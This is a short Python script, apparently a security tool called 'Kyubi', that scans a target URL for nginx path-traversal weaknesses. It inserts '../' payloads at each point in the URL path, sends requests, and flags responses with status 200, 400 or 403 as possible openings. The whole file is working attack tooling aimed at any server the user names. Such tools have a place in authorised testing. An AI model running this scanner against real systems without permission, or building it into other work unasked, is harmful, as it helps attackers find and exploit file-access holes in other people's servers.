try:
    from urllib.parse import urlparse
except ImportError:
     from urlparse import urlparse
from colorama import Fore, init
from termcolor import colored
import sys
import argparse as ag
import requests as rq
import pyfiglet

init()

argparser = ag.ArgumentParser(description="This is a nginx traversal tool")
argparser.add_argument("url", type=str, help="URL of the target")
argparser.add_argument("-v", help="increase verbosity", action="store_true")
argparser.add_argument("-a", help="append segment in the end", action="store_true")

args = argparser.parse_args()

valid = ['403', '400', '200']
payloads = ["../", "../../", "../../../../../../../../../../../"]

def make_a_request (url):
    resp = 500
    try:
        resp = rq.get(url, verify=True).status_code
    except Exception as e:
        resp = 500
    return str(resp)

def main():
    parser = urlparse(args.url)
    path = parser.path

    segments = path.split("/")
    segments = segments[1: len(segments)]

    _str = ""
    _marks = ('-' * 80)
    sys.stdout.write("\n{0:50}\t{1}\n{2}\n".format("URL", "Status",_marks))
    for segment in segments:
        _str += "/"+segment
        if(args.a): _x = segment
        else:
            _x = ""
        for payload in payloads:
            _url = "{}://{}{}{}{}".format(parser.scheme, parser.netloc, _str, payload, _x)
            statcode = make_a_request(_url)
            if(args.v):
                sys.stdout.write("{0} [{1}]\n".format(_url, colored(statcode, 'green') if statcode in valid else colored(statcode, 'red')))
            else:
                if(statcode in valid):
                    sys.stdout.write("{0} [{1}]\n".format(_url, colored(statcode, 'green')))
    for i in range(0, len(segments)-1):
        for payload in payloads:
            _url = parser.scheme+"://"+parser.netloc+"/" + '/'.join(segments[0:i+1]) + payload + '/'.join(segments[i+1:len(segments)])
            statcode = make_a_request(_url)
            if(args.v):
                sys.stdout.write("{} [{}]\n".format(_url, colored(statcode, 'green') if statcode in valid else colored(statcode, 'red')))
            else:
                if(statcode in valid):
                    sys.stdout.write("{0} [{1}]\n".format(_url, colored(statcode, 'green')))



if __name__ == '__main__':
    print(pyfiglet.figlet_format("Kyubi"))
    main()
